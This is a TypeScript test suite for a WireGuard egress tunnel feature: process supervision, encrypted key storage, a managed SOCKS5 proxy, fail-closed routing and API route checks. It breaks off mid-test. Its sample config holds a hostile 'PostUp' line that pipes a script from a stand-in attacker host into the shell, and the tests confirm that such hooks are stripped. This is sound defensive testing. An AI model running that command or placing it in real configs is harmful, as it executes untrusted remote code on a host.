import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import { EventEmitter } from "node:events";
import {
  existsSync,
  mkdirSync,
  mkdtempSync,
  readdirSync,
  readFileSync,
  rmSync,
  statSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { after, before, test } from "node:test";

// Real database on a scratch install, real encryption, real config files on disk. NO real process
// (wireproxy is replaced at the spawn seam) and NO network (the download is a fake).
const dataDir = mkdtempSync(join(tmpdir(), "redrouter-wg-egress-"));
process.env.DATA_DIR = dataDir;
process.env.JWT_SECRET = "test-jwt-secret-for-wireguard-egress";
process.env.STORAGE_ENCRYPTION_KEY = "test-storage-encryption-key-for-wireguard-egress";
process.env.API_PORT = "20128";
delete process.env.WIREPROXY_BIN;

const { getDbInstance, resetDbInstance } = await import("../../../src/lib/db/core.ts");
const { getSettings, updateSettings } = await import("../../../src/lib/db/settings.ts");
const { hashManagementPassword } = await import("../../../src/lib/auth/managementPassword.ts");
const { DASHBOARD_SESSION_COOKIE, getDashboardJwtSecret, mintDashboardSessionToken } =
  await import("../../../src/shared/utils/dashboardSessionToken.ts");
const proxies = await import("../../../src/lib/db/proxies.ts");
const egressDb = await import("../../../src/lib/db/wireguardEgress.ts");
const proc = await import("../../../src/lib/wireguard/egressProcess.ts");
const bin = await import("../../../src/lib/wireguard/egressBinary.ts");
const service = await import("../../../src/lib/wireguard/egressService.ts");
const listRoute = await import("../../../src/app/api/settings/wireguard-egress/route.ts");
const idRoute = await import("../../../src/app/api/settings/wireguard-egress/[id]/route.ts");
const binaryRoute = await import("../../../src/app/api/settings/wireguard-egress/binary/route.ts");
const installRoute =
  await import("../../../src/app/api/settings/wireguard-egress/install-binary/route.ts");
const guard = await import("../../../src/server/authz/routeGuard.ts");
const { SPAWN_CAPABLE_PREFIXES } =
  await import("../../../src/shared/constants/spawnCapablePrefixes.ts");
const { getAuditLog } = await import("../../../src/lib/compliance/index.ts");

const key = (fill: number) => Buffer.alloc(32, fill).toString("base64");
const PRIV = key(0x11);
const PUB = key(0x22);
const PSK = key(0x33);
const PASSWORD = "correct horse battery staple 42";
const PREFIX = "/api/settings/wireguard-egress";

const CONFIG = `[Interface]
PrivateKey = ${PRIV}
Address = 10.66.66.2/32,fc00:bbbb:bbbb:bb01::3:4a3c/128
DNS = 10.64.0.1
PostUp = curl http://evil.example/x.sh | sh

[Peer]
PublicKey = ${PUB}
PresharedKey = ${PSK}
AllowedIPs = 0.0.0.0/0,::0/0
Endpoint = 185.213.154.68:51820
`;

// Everything logged during the run is checked for key material at the end.
const logged: string[] = [];
const originals = {
  log: console.log,
  error: console.error,
  warn: console.warn,
  info: console.info,
};
for (const level of ["log", "error", "warn", "info"] as const) {
  console[level] = (...args: unknown[]) => {
    logged.push(args.map((arg) => (arg instanceof Error ? arg.message : String(arg))).join(" "));
  };
}

// --- a fake wireproxy ---------------------------------------------------------------------------

type SpawnCall = {
  command: string;
  args: string[];
  env: NodeJS.ProcessEnv;
  configText: string;
  configMode: number;
  dirMode: number;
  port: number;
};

class FakeChild extends EventEmitter {
  pid = 5000 + Math.floor(Math.random() * 1000);
  stdout = new EventEmitter();
  stderr = new EventEmitter();
  killed: string[] = [];
  onKill: () => void = () => {};
  kill(signal: string) {
    this.killed.push(signal);
    this.onKill();
    setImmediate(() => this.emit("exit", null, signal));
    return true;
  }
}

const listening = new Set<number>();
let nextPort = 41000;
let spawnCalls: SpawnCall[] = [];
let children: FakeChild[] = [];
type Behaviour = (child: FakeChild, call: SpawnCall) => void;
let behaviour: Behaviour = healthy;

function healthy(child: FakeChild, call: SpawnCall) {
  setImmediate(() => listening.add(call.port));
  child.onKill = () => listening.delete(call.port);
}

function installFake(
  overrides: Partial<import("../../../src/lib/wireguard/egressProcess.ts").EgressRuntime> = {}
) {
  spawnCalls = [];
  children = [];
  listening.clear();
  behaviour = healthy;
  proc.setWireGuardEgressRuntime({
    spawn: ((command: string, args: string[], options: { env: NodeJS.ProcessEnv }) => {
      const configPath = args[1];
      const configText = readFileSync(configPath, "utf8");
      const port = Number(/BindAddress = 127\.0\.0\.1:(\d+)/.exec(configText)?.[1]);
      const call: SpawnCall = {
        command,
        args: [...args],
        env: options.env,
        configText,
        configMode: statSync(configPath).mode & 0o777,
        dirMode: statSync(join(configPath, "..")).mode & 0o777,
        port,
      };
      spawnCalls.push(call);
      const child = new FakeChild();
      children.push(child);
      behaviour(child, call);
      return child;
    }) as never,
    resolveBinary: async () => ({
      binaryPath: "/fake/bin/wireproxy",
      source: "path",
      managed: false,
    }),
    probePort: async (port: number) => listening.has(port),
    findFreePort: async () => nextPort++,
    startTimeoutMs: 1500,
    probeIntervalMs: 10,
    stopTimeoutMs: 300,
    backoffBaseMs: 20,
    backoffMaxMs: 60,
    maxRestarts: 3,
    stableAfterMs: 60_000,
    ...overrides,
  });
}

async function waitFor(condition: () => boolean, ms = 2000, label = "condition") {
  const deadline = Date.now() + ms;
  while (!condition() && Date.now() < deadline)
    await new Promise((resolve) => setTimeout(resolve, 10));
  assert.ok(condition(), `timed out waiting for ${label}`);
}

const runtimeDir = () => join(dataDir, "wireguard-egress", "runtime");
const configFiles = () =>
  existsSync(runtimeDir()) ? readdirSync(runtimeDir()).filter((f) => f.endsWith(".conf")) : [];

function spec(
  id: string,
  port: number,
  extra = ""
): import("../../../src/lib/wireguard/egressProcess.ts").EgressSpec {
  return {
    id,
    socksPort: port,
    loadConfig: () =>
      `[Interface]\nPrivateKey = ${PRIV}\n\n[Peer]\nPresharedKey = ${PSK}\n\n[Socks5]\nBindAddress = 127.0.0.1:${port}\n${extra}`,
  };
}

async function cookie() {
  const token = await mintDashboardSessionToken(getDashboardJwtSecret());
  return `${DASHBOARD_SESSION_COOKIE}=${token}`;
}

async function call(
  handler: (request: Request, context?: never) => Promise<Response>,
  url: string,
  method: string,
  body?: unknown,
  options: { authenticated?: boolean; id?: string; raw?: string } = {}
) {
  const headers: Record<string, string> = {};
  const hasBody = body !== undefined || options.raw !== undefined;
  if (hasBody) headers["content-type"] = "application/json";
  if (options.authenticated !== false) headers.cookie = await cookie();
  const request = new Request(`http://localhost${url}`, {
    method,
    headers,
    body:
      options.raw !== undefined
        ? options.raw
        : body === undefined
          ? undefined
          : JSON.stringify(body),
  });
  const context =
    options.id !== undefined ? { params: Promise.resolve({ id: options.id }) } : undefined;
  const response = await handler(request, context as never);
  const text = await response.text();
  return { status: response.status, text, json: text ? JSON.parse(text) : null };
}

before(async () => {
  await updateSettings({ requireLogin: true, password: await hashManagementPassword(PASSWORD) });
});

after(async () => {
  await proc.stopAllEgressProcesses();
  proc.setWireGuardEgressRuntime(null);
  bin.setWireproxyBinaryRuntime(null);
  for (const level of Object.keys(originals) as Array<keyof typeof originals>)
    console[level] = originals[level];
  resetDbInstance();
  rmSync(dataDir, { recursive: true, force: true });
});

// --- process state machine ----------------------------------------------------------------------

test("process: ready by TCP probe, config 0600 in a 0700 dir, argv and env carry no secrets, stop cleans up", async () => {
  installFake();
  const seen: string[] = [];
  const unsubscribe = proc.onEgressStateChange((s) => seen.push(`${s.id}:${s.phase}`));
  const status = await proc.startEgressProcess(spec("p-one", 42001));
  unsubscribe();
  assert.equal(status.phase, "running");
  assert.deepEqual(seen, ["p-one:starting", "p-one:running"]);
  assert.equal(spawnCalls.length, 1);
  const [c] = spawnCalls;
  assert.equal(c.command, "/fake/bin/wireproxy");
  assert.deepEqual(c.args, ["-c", join(runtimeDir(), "p-one.conf")]);
  assert.equal(c.configMode, 0o600, "config file is owner-only");
  assert.equal(c.dirMode, 0o700, "runtime dir is owner-only");
  assert.ok(c.configText.includes(PRIV), "the config file (and only it) carries the key");
  assert.ok(!c.args.join(" ").includes(PRIV) && !c.args.join(" ").includes(PSK), "no key in argv");
  assert.deepEqual(
    Object.keys(c.env)
      .sort()
      .filter((k) => k !== "PATH"),
    ["HOME", "TMPDIR", "USERPROFILE"]
  );
  for (const forbidden of [
    "JWT_SECRET",
    "STORAGE_ENCRYPTION_KEY",
    "DATA_DIR",
    "API_PORT",
    "HTTP_PROXY",
    "HTTPS_PROXY",
  ]) {
    assert.equal(c.env[forbidden], undefined, forbidden);
  }
  assert.ok(!JSON.stringify(c.env).includes(PRIV));
  assert.deepEqual(configFiles(), ["p-one.conf"]);

  // A second start while running is a no-op.
  assert.equal((await proc.startEgressProcess(spec("p-one", 42001))).phase, "running");
  assert.equal(spawnCalls.length, 1);

  const stopped = await proc.stopEgressProcess("p-one");
  assert.equal(stopped.phase, "stopped");
  assert.deepEqual(children[0].killed, ["SIGTERM"]);
  assert.deepEqual(configFiles(), [], "the key file is deleted on stop");
  // No restart after a deliberate stop.
  await new Promise((resolve) => setTimeout(resolve, 150));
  assert.equal(spawnCalls.length, 1);
  assert.equal(proc.getEgressProcessStatus("p-one").phase, "stopped");
});

test("process: readiness is the TCP probe, not log text", async () => {
  installFake({ startTimeoutMs: 150 });
  behaviour = (child) => {
    // Looks ready in the logs, but nothing ever listens.
    setImmediate(() =>
      child.stdout.emit("data", Buffer.from("Info: Started SOCKS5 server, ready, running"))
    );
  };
  const status = await proc.startEgressProcess(spec("p-logs", 42002));
  assert.notEqual(status.phase, "running");
  assert.equal(status.phase, "error");
  assert.match(status.lastError ?? "", /Timed out/);
  assert.deepEqual(children[0].killed, ["SIGTERM"], "the stuck process is killed");
  await proc.stopEgressProcess("p-logs");
  assert.deepEqual(configFiles(), []);
});

test("process: a crash restarts with backoff, the error is redacted, and it recovers", async () => {
  installFake();
  const phases: string[] = [];
  const unsubscribe = proc.onEgressStateChange((s) => phases.push(s.phase));
  behaviour = (child, c) => {
    if (spawnCalls.length === 1) {
      setImmediate(() => {
        child.stderr.emit(
          "data",
          Buffer.from(`fatal: bad key ${PRIV} in /home/alice/.config/x.conf, psk ${PSK}\n`)
        );
        child.emit("exit", 1, null);
      });
    } else {
      healthy(child, c);
    }
  };
  const first = await proc.startEgressProcess(spec("p-crash", 42003));
  assert.equal(first.phase, "error");
  assert.ok(first.retryInMs !== null && first.retryInMs > 0, "a retry is scheduled");
  assert.ok(!first.lastError!.includes(PRIV) && !first.lastError!.includes(PSK), "keys redacted");
  assert.ok(
    !first.lastError!.includes("alice") && !first.lastError!.includes("/home"),
    "paths redacted"
  );
  assert.deepEqual(configFiles(), [], "the key file is removed when the process dies");

  await waitFor(() => proc.getEgressProcessStatus("p-crash").phase === "running", 2000, "restart");
  unsubscribe();
  assert.equal(spawnCalls.length, 2);
  assert.equal(proc.getEgressProcessStatus("p-crash").restarts, 1);
  assert.deepEqual(
    phases.filter((p, i) => phases[i - 1] !== p),
    ["starting", "error", "starting", "running"]
  );
  await proc.stopEgressProcess("p-crash");
});

test("process: the restart budget is bounded, then it stays in error", async () => {
  installFake({ maxRestarts: 2 });
  behaviour = (child) => setImmediate(() => child.emit("exit", 2, null));
  const first = await proc.startEgressProcess(spec("p-limit", 42004));
  assert.equal(first.phase, "error");
  await waitFor(() => spawnCalls.length === 3, 2000, "three attempts");
  await waitFor(() => proc.getEgressProcessStatus("p-limit").retryInMs === null, 2000, "gave up");
  await new Promise((resolve) => setTimeout(resolve, 150));
  assert.equal(spawnCalls.length, 3, "1 start + 2 restarts, no more");
  const status = proc.getEgressProcessStatus("p-limit");
  assert.equal(status.phase, "error");
  assert.match(status.lastError ?? "", /Restart limit reached/);
  assert.deepEqual(configFiles(), []);
  await proc.stopEgressProcess("p-limit");
  assert.equal(proc.getEgressProcessStatus("p-limit").phase, "stopped");
});

test("process: no binary is a terminal error without spawning", async () => {
  installFake({ resolveBinary: async () => ({ binaryPath: null, source: null, managed: false }) });
  const status = await proc.startEgressProcess(spec("p-nobin", 42005));
  assert.equal(status.phase, "error");
  assert.match(status.lastError ?? "", /not installed/);
  assert.equal(status.retryInMs, null);
  assert.equal(spawnCalls.length, 0);
  assert.deepEqual(configFiles(), []);
  await proc.stopEgressProcess("p-nobin");
});

test("process: stopAll stops everything; bad ids are refused; redaction helper", async () => {
  installFake();
  await proc.startEgressProcess(spec("p-a", 42006));
  await proc.startEgressProcess(spec("p-b", 42007));
  assert.deepEqual(configFiles().sort(), ["p-a.conf", "p-b.conf"]);
  await proc.stopAllEgressProcesses();
  assert.equal(proc.getEgressProcessStatus("p-a").phase, "stopped");
  assert.equal(proc.getEgressProcessStatus("p-b").phase, "stopped");
  assert.deepEqual(configFiles(), []);
  await assert.rejects(() => proc.startEgressProcess(spec("../evil", 42008)), /Invalid profile id/);
  const redacted = proc.redactEgressText(
    `secret hunter2hunter2 ${PRIV} at C:\\Users\\bob\\x.conf and /etc/wg/a.conf`,
    ["hunter2hunter2"]
  );
  for (const leak of ["hunter2", PRIV, "bob", "/etc/wg"]) assert.ok(!redacted.includes(leak), leak);
  assert.equal(
    proc.extractConfigSecrets("PrivateKey = abc\nPassword = def\nEndpoint = x").join(","),
    "abc,def"
  );
  assert.deepEqual(proc.getEgressArgs("/x/y.conf"), ["-c", "/x/y.conf"]);
});

// --- persistence --------------------------------------------------------------------------------

let profileId = "";
let proxyId = "";

test("persistence: keys are encrypted at rest and absent from every read path", async () => {
  installFake();
  const created = await service.createEgressProfile({ name: "Mullvad SE", config: CONFIG });
  profileId = created.profile.id;
  assert.equal(created.profile.hasPrivateKey, true);
  assert.equal(created.profile.hasPresharedKey, true);
  assert.equal(created.profile.enabled, false);
  assert.equal(created.profile.status.phase, "stopped");
  assert.equal(created.profile.publicKey, PUB);
  assert.equal(created.profile.endpointHost, "185.213.154.68");
  assert.deepEqual(created.profile.addresses, ["10.66.66.2/32", "fc00:bbbb:bbbb:bb01::3:4a3c/128"]);
  assert.deepEqual(
    created.ignored.map((line) => line.key),
    ["PostUp"]
  );
  assert.ok(created.profile.socksPort >= 41000);
  const view = JSON.stringify(created);
  for (const secret of [PRIV, PSK]) assert.ok(!view.includes(secret));
  for (const field of [
    "privateKey",
    "presharedKey",
    "socksPassword",
    "socksUsername",
    "password",
  ]) {
    assert.ok(!(field in created.profile), field);
  }

  // At rest: ciphertext only.
  const row = getDbInstance()
    .prepare("SELECT value FROM key_value WHERE namespace = 'settings' AND key = ?")
    .get(`_wireguardEgressSecret:${profileId}`) as { value: string };
  assert.ok((JSON.parse(row.value) as string).startsWith("enc:v1:"), "secret blob is encrypted");
  getDbInstance().pragma("wal_checkpoint(TRUNCATE)");
  const dump = [join(dataDir, "storage.sqlite"), join(dataDir, "storage.sqlite-wal")]
    .filter(existsSync)
    .map((file) => readFileSync(file, "latin1"))
    .join("\n");
  const secrets = egressDb.readWireGuardEgressSecrets(profileId)!;
  for (const secret of [PRIV, PSK, secrets.socksPassword]) {
    assert.ok(secret.length > 8);
    assert.ok(!dump.includes(secret), "no secret appears in the database file");
  }
  const all = getDbInstance().prepare("SELECT key, value FROM key_value").all() as Array<{
    key: string;
    value: string;
  }>;
  assert.ok(!JSON.stringify(all).includes(PRIV));
  assert.ok(!JSON.stringify(all).includes(PSK));

  // getSettings() skips `_` keys; the stored config is not echoed by any settings read.
  const settings = await getSettings();
  assert.ok(!Object.keys(settings).some((k) => k.startsWith("_wireguardEgress")));
  assert.ok(!JSON.stringify(settings).includes(PRIV));

  // Lists and detail views.
  assert.ok(!JSON.stringify(egressDb.listWireGuardEgressProfiles()).includes(PRIV));
  assert.ok(!JSON.stringify(await service.listEgressProfiles()).includes(PSK));
  // Round-trip for the supervisor only.
  const model = egressDb.readWireGuardEgressModel(profileId)!;
  assert.equal(model.model.privateKey, PRIV);
  assert.equal(model.model.peer.presharedKey, PSK);
});

test("persistence: names are unique and bounded", async () => {
  await assert.rejects(
    () => service.createEgressProfile({ name: "mullvad se", config: CONFIG }),
    (e: { code?: string }) => e.code === "duplicate_name"
  );
  await assert.rejects(
    () => service.createEgressProfile({ name: "  ", config: CONFIG }),
    (e: { code?: string }) => e.code === "invalid_name"
  );
  await assert.rejects(
    () => service.createEgressProfile({ name: "x".repeat(65), config: CONFIG }),
    (e: { code?: string }) => e.code === "invalid_name"
  );
  await assert.rejects(
    () => service.createEgressProfile({ name: "Bad", config: CONFIG.replace(PRIV, "nope") }),
    (e: { code?: string; details?: string[] }) =>
      e.code === "config_invalid" && e.details!.length > 0
  );
});

// --- registry linkage and fail-closed behaviour -------------------------------------------------

test("registry: enabling creates a managed socks5 127.0.0.1 proxy, active only while running", async () => {
  installFake();
  const enabled = await service.enableEgressProfile(profileId);
  assert.equal(enabled.enabled, true);
  assert.equal(enabled.status.phase, "running");
  assert.ok(enabled.proxy && enabled.proxy.status === "active");
  proxyId = enabled.proxy!.id;

  const proxy = (await proxies.getProxyById(proxyId, { includeSecrets: true }))!;
  assert.equal(proxy.type, "socks5");
  assert.equal(proxy.host, "127.0.0.1");
  assert.equal(proxy.port, enabled.socksPort);
  assert.equal(proxy.name, "WireGuard: Mullvad SE");
  assert.equal(proxy.source, "wireguard-egress");
  assert.equal(proxy.status, "active");
  assert.match(proxy.username, /^rr[0-9a-f]{12}$/);
  // The SOCKS credentials in the registry match the ones in the rendered config.
  assert.ok(spawnCalls[0].configText.includes(`Username = ${proxy.username}`));
  assert.ok(spawnCalls[0].configText.includes(`Password = ${proxy.password}`));
  assert.ok(spawnCalls[0].configText.includes(`BindAddress = 127.0.0.1:${enabled.socksPort}`));
  assert.ok(!spawnCalls[0].configText.includes("0.0.0.0:"));
  assert.ok(!spawnCalls[0].configText.includes("evil"), "wg-quick hooks were never carried over");
  // A redacted registry listing never returns the password.
  const listed = (await proxies.listProxies()).items.find((p) => p.id === proxyId)!;
  assert.notEqual(listed.password, proxy.password);
});

test("registry: the managed proxy cannot be edited or deleted by hand, but can be assigned", async () => {
  await assert.rejects(
    () => proxies.updateProxy(proxyId, { host: "203.0.113.9" }),
    (e: { code?: string; status?: number }) => e.code === "proxy_managed" && e.status === 409
  );
  await assert.rejects(
    () => proxies.updateProxy(proxyId, { status: "active" }),
    (e: { code?: string }) => e.code === "proxy_managed"
  );
  await assert.rejects(
    () => proxies.deleteProxyById(proxyId, { force: true }),
    (e: { code?: string }) => e.code === "proxy_managed"
  );
  await assert.rejects(
    () =>
      proxies.updateProxyAndAssign(
        proxyId,
        { name: "renamed" },
        { scope: "provider", scopeId: "prov-x" }
      ),
    (e: { code?: string }) => e.code === "proxy_managed"
  );
  // Assignment-only updates and plain assignments are fine.
  assert.ok(
    await proxies.updateProxyAndAssign(proxyId, {}, { scope: "provider", scopeId: "prov-assign" })
  );
  assert.equal((await proxies.getProxyById(proxyId))!.name, "WireGuard: Mullvad SE");
  await proxies.assignProxyToScope("provider", "prov-assign", null);
});

test("fail closed: an assignment routes through the tunnel while running and is refused, not direct, when it is down", async () => {
  await proxies.assignProxyToScope("provider", "prov-vpn", proxyId);

  // Running: the provider resolves to the loopback SOCKS5 proxy and nothing blocks it.
  const running = (await proxies.resolveProxyForProvider("prov-vpn"))!;
  assert.equal(running.type, "socks5");
  assert.equal(running.host, "127.0.0.1");
  assert.equal(running.port, (await service.getEgressProfile(profileId))!.socksPort);
  assert.equal(proxies.hasBlockingProxyAssignmentForProvider("prov-vpn"), false);
  assert.equal(proxies.hasBlockingProxyAssignment("conn-1", "prov-vpn"), false);

  // Disabled: the proxy is inactive, resolution yields nothing AND the assignment blocks.
  const disabled = await service.disableEgressProfile(profileId);
  assert.equal(disabled.enabled, false);
  assert.equal(disabled.status.phase, "stopped");
  assert.equal(disabled.proxy!.status, "inactive");
  assert.deepEqual(configFiles(), []);
  assert.equal(await proxies.resolveProxyForProvider("prov-vpn"), null);
  assert.equal(
    proxies.hasBlockingProxyAssignmentForProvider("prov-vpn"),
    true,
    "must not fall back to direct"
  );
  assert.equal(
    proxies.hasBlockingProxyAssignment("conn-1", "prov-vpn"),
    true,
    "must not fall back to direct"
  );
  // The generic registry paths cannot re-activate it either.
  await assert.rejects(() => proxies.updateProxy(proxyId, { status: "active" }), /managed/);

  // Re-enabled: back to active with the SAME registry row (assignments survive).
  installFake();
  const again = await service.enableEgressProfile(profileId);
  assert.equal(again.proxy!.id, proxyId);
  assert.equal(again.proxy!.status, "active");
  assert.equal(proxies.hasBlockingProxyAssignmentForProvider("prov-vpn"), false);
  assert.ok(await proxies.resolveProxyForProvider("prov-vpn"));

  // A tunnel that dies and exhausts its restart budget flips the proxy to inactive on its own.
  installFake({ maxRestarts: 1 });
  behaviour = (child) => setImmediate(() => child.emit("exit", 1, null));
  await service.restartEgressProfile(profileId);
  await waitFor(
    () => proc.getEgressProcessStatus(profileId).retryInMs === null && spawnCalls.length === 2,
    2000,
    "gave up"
  );
  await waitFor(
    () => proxies.hasBlockingProxyAssignmentForProvider("prov-vpn"),
    2000,
    "proxy inactive after crash"
  );
  assert.equal((await proxies.getProxyById(proxyId))!.status, "inactive");
  assert.equal(await proxies.resolveProxyForProvider("prov-vpn"), null);

  // Restart brings it back.
  installFake();
  const restarted = await service.restartEgressProfile(profileId);
  assert.equal(restarted.status.phase, "running");
  assert.equal(restarted.proxy!.status, "active");
  assert.deepEqual(children[0].killed, [], "fresh process");
  await proc.stopEgressProcess(profileId);
});

test("registry: a busy saved port is replaced before the tunnel starts", async () => {
  installFake();
  const before = (await service.getEgressProfile(profileId))!.socksPort;
  listening.add(before); // something else took the port while the tunnel was down
  const enabled = await service.enableEgressProfile(profileId);
  assert.notEqual(enabled.socksPort, before);
  assert.equal(enabled.status.phase, "running");
  const proxy = (await proxies.getProxyById(proxyId))!;
  assert.equal(proxy.port, enabled.socksPort, "the registry proxy follows the new port");
  await service.disableEgressProfile(profileId);
});

test("delete: refused while the proxy is assigned; allowed once unassigned; force drops assignments", async () => {
  await assert.rejects(
    () => service.deleteEgressProfile(profileId),
    (e: { code?: string }) => e.code === "in_use"
  );
  assert.ok(await proxies.getProxyById(proxyId), "proxy still there");
  assert.ok(egressDb.getWireGuardEgressProfile(profileId), "profile still there");

  await proxies.assignProxyToScope("provider", "prov-vpn", null);
  installFake();
  await service.enableEgressProfile(profileId);
  await service.deleteEgressProfile(profileId);
  assert.equal(egressDb.getWireGuardEgressProfile(profileId), null);
  assert.equal(egressDb.readWireGuardEgressSecrets(profileId), null);
  assert.equal(await proxies.getProxyById(proxyId), null, "registry proxy removed");
  assert.deepEqual(configFiles(), []);
  assert.equal(proc.getEgressProcessStatus(profileId).phase, "stopped");

  // Force: the explicit escape hatch. The assignments go with the proxy (documented).
  const second = await service.createEgressProfile({ name: "Second", config: CONFIG });
  installFake();
  const enabled = await service.enableEgressProfile(second.profile.id);
  await proxies.assignProxyToScope("provider", "prov-forced", enabled.proxy!.id);
  await service.deleteEgressProfile(second.profile.id, { force: true });
  assert.equal((await proxies.getProxyAssignments({ proxyId: enabled.proxy!.id })).length, 0);
  assert.equal(await proxies.getProxyById(enabled.proxy!.id), null);
});

test("restore on boot: proxies start inactive, stale key files are removed, enabled profiles restart", async () => {
  installFake();
  const a = await service.createEgressProfile({ name: "Boot A", config: CONFIG });
  const b = await service.createEgressProfile({ name: "Boot B", config: CONFIG });
  const enabledA = await service.enableEgressProfile(a.profile.id);
  await service.enableEgressProfile(b.profile.id);
  await service.disableEgressProfile(b.profile.id);
  // Simulate a crash: processes gone without cleanup, key file left behind, registry says active.
  await proc.stopAllEgressProcesses();
  mkdirSync(runtimeDir(), { recursive: true });
  writeFileSync(join(runtimeDir(), "stale.conf"), `PrivateKey = ${PRIV}\n`);
  await proxies.updateProxy(enabledA.proxy!.id, { status: "active" }, { allowManaged: true });

  installFake();
  await service.restoreWireGuardEgress();
  assert.ok(!existsSync(join(runtimeDir(), "stale.conf")), "stale key file removed");
  assert.equal(
    proc.getEgressProcessStatus(a.profile.id).phase,
    "running",
    "enabled profile restarted"
  );
  assert.equal(
    proc.getEgressProcessStatus(b.profile.id).phase,
    "stopped",
    "disabled profile stays down"
  );
  const rows = await service.listEgressProfiles();
  assert.equal(rows.find((r) => r.id === a.profile.id)!.proxy!.status, "active");
  assert.equal(rows.find((r) => r.id === b.profile.id)!.proxy!.status, "inactive");
  await service.shutdownWireGuardEgress();
  assert.equal(proc.getEgressProcessStatus(a.profile.id).phase, "stopped");
  assert.equal(
    (await service.listEgressProfiles()).find((r) => r.id === a.profile.id)!.proxy!.status,
    "inactive"
  );
  for (const p of [a, b]) await service.deleteEgressProfile(p.profile.id);
});

// --- routes -------------------------------------------------------------------------------------

test("routes: every handler answers 401 without a management session", async () => {
  const id = "some-id";
  const cases: Array<[string, () => Promise<{ status: number }>]> = [
    ["GET list", () => call(listRoute.GET, PREFIX, "GET", undefined, { authenticated: false })],
    [
      "POST create",
      () =>
        call(
          listRoute.POST,
          PREFIX,
          "POST",
          { name: "x", config: CONFIG },
          { authenticated: false }
        ),
    ],
    [
      "GET binary",
      () => call(binaryRoute.GET, `${PREFIX}/binary`, "GET", undefined, { authenticated: false }),
    ],
    [
      "POST install",
      () =>
        call(installRoute.POST, `${PREFIX}/install-binary`, "POST", undefined, {
          authenticated: false,
        }),
    ],
    [
      "GET id",
      () => call(idRoute.GET, `${PREFIX}/${id}`, "GET", undefined, { authenticated: false, id }),
    ],
    [
      "PATCH id",
      () =>
        call(
          idRoute.PATCH,
          `${PREFIX}/${id}`,
          "PATCH",
          { action: "enable" },
          { authenticated: false, id }
        ),
    ],
    [
      "DELETE id",
      () =>
        call(idRoute.DELETE, `${PREFIX}/${id}`, "DELETE", undefined, { authenticated: false, id }),
    ],
  ];
  const before = egressDb.listWireGuardEgressProfiles().length;
  for (const [label, run] of cases) assert.equal((await run()).status, 401, label);
  assert.equal(egressDb.listWireGuardEgressProfiles().length, before, "nothing was created");
});

test("routes: validation errors are fixed 400s that never echo the submitted config", async () => {
  const junk = "SUPER-SECRET-LOOKING-VALUE";
  const twoPeers = `${CONFIG}\n[Peer]\nPublicKey = ${key(0x44)}\nEndpoint = 1.2.3.4:51820\nAllowedIPs = 0.0.0.0/0\n`;
  const cases: Array<[string, unknown, string?]> = [
    ["missing name", { config: CONFIG }],
    ["missing config", { name: "x" }],
    ["unknown key", { name: "x", config: CONFIG, extra: 1 }],
    ["empty config", { name: "x", config: "" }],
    ["non-string config", { name: "x", config: 5 }],
    ["oversize config", { name: "x", config: `${CONFIG}#${"x".repeat(17 * 1024)}` }],
    ["multiple peers", { name: "x", config: twoPeers }],
    ["bad key", { name: "x", config: CONFIG.replace(PRIV, junk) }],
    ["control chars", { name: "x", config: CONFIG.replace("10.64.0.1", "10.64.0.1\u0000") }],
    [
      "bad endpoint",
      { name: "x", config: CONFIG.replace("185.213.154.68:51820", `https://${junk}:99`) },
    ],
  ];
  for (const [label, body] of cases) {
    const result = await call(listRoute.POST, PREFIX, "POST", body);
    assert.equal(result.status, 400, label);
    for (const leak of [junk, PRIV, PSK]) assert.ok(!result.text.includes(leak), `${label} leaked`);
  }
  const notJson = await call(listRoute.POST, PREFIX, "POST", undefined, { raw: "{oops" });
  assert.equal(notJson.status, 400);
  const bad = await call(idRoute.PATCH, `${PREFIX}/x`, "PATCH", { action: "explode" }, { id: "x" });
  assert.equal(bad.status, 400);
  assert.equal(
    (await call(idRoute.PATCH, `${PREFIX}/x`, "PATCH", { action: "enable", more: 1 }, { id: "x" }))
      .status,
    400
  );
  assert.equal(
    (await call(idRoute.PATCH, `${PREFIX}/nope`, "PATCH", { action: "enable" }, { id: "nope" }))
      .status,
    404
  );
  assert.equal(
    (await call(idRoute.PATCH, `${PREFIX}/..%2Fx`, "PATCH", { action: "enable" }, { id: "../x" }))
      .status,
    404
  );
  assert.equal(
    (await call(idRoute.DELETE, `${PREFIX}/nope`, "DELETE", undefined, { id: "nope" })).status,
    404
  );
  assert.equal(
    (await call(idRoute.GET, `${PREFIX}/nope`, "GET", undefined, { id: "nope" })).status,
    404
  );
  // A duplicate name is a 409.
  const first = await call(listRoute.POST, PREFIX, "POST", { name: "Dup", config: CONFIG });
  assert.equal(first.status, 201);
  assert.equal(
    (await call(listRoute.POST, PREFIX, "POST", { name: "dup", config: CONFIG })).status,
    409
  );
  assert.equal(
    (
      await call(idRoute.DELETE, `${PREFIX}/${first.json.profile.id}`, "DELETE", undefined, {
        id: first.json.profile.id,
      })
    ).status,
    200
  );
});

test("routes: create, list, enable, disable, restart, delete, with no key ever in a response", async () => {
  installFake();
  const created = await call(listRoute.POST, PREFIX, "POST", {
    name: "Route Profile",
    config: CONFIG,
  });
  assert.equal(created.status, 201, created.text);
  const id = created.json.profile.id as string;
  assert.equal(created.json.profile.hasPrivateKey, true);
  assert.deepEqual(
    created.json.ignored.map((l: { key: string }) => l.key),
    ["PostUp"]
  );
  assert.ok(Array.isArray(created.json.warnings));

  const listed = await call(listRoute.GET, PREFIX, "GET");
  assert.equal(listed.status, 200);
  assert.ok(listed.json.items.some((item: { id: string }) => item.id === id));

  const enabled = await call(
    idRoute.PATCH,
    `${PREFIX}/${id}`,
    "PATCH",
    { action: "enable" },
    { id }
  );
  assert.equal(enabled.status, 200, enabled.text);
  assert.equal(enabled.json.profile.status.phase, "running");
  assert.equal(enabled.json.profile.proxy.status, "active");
  const detail = await call(idRoute.GET, `${PREFIX}/${id}`, "GET", undefined, { id });
  assert.equal(detail.json.profile.status.phase, "running");

  const restarted = await call(
    idRoute.PATCH,
    `${PREFIX}/${id}`,
    "PATCH",
    { action: "restart" },
    { id }
  );
  assert.equal(restarted.status, 200, restarted.text);
  assert.equal(spawnCalls.length, 2);

  // Assigned: delete is a fixed 409 that says why.
  await proxies.assignProxyToScope("provider", "prov-route", enabled.json.profile.proxy.id);
  const blocked = await call(idRoute.DELETE, `${PREFIX}/${id}`, "DELETE", undefined, { id });
  assert.equal(blocked.status, 409);
  assert.match(blocked.json.error.message, /still assigned/);
  await proxies.assignProxyToScope("provider", "prov-route", null);

  const disabled = await call(
    idRoute.PATCH,
    `${PREFIX}/${id}`,
    "PATCH",
